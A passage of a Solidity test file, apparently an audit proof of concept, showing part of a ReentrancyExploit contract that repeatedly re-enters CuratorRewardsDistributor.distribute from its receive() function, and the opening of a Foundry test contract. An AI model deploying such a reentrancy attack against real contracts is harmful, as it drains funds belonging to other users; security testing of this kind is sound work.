    uint256 public credId;

    constructor(CuratorRewardsDistributor _target, uint256 _credId) {
        target = _target;
        credId = _credId;
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.distribute(credId);
        }
    }

    function attack() external {
        target.distribute(credId);
    }
}

contract CuratorRewardsDistributorTest is Test {
    CuratorRewardsDistributor public distributor;
    ICred public credContract;
    IPhiRewards public phiRewardsContract;
    ReentrancyExploit public exploit;
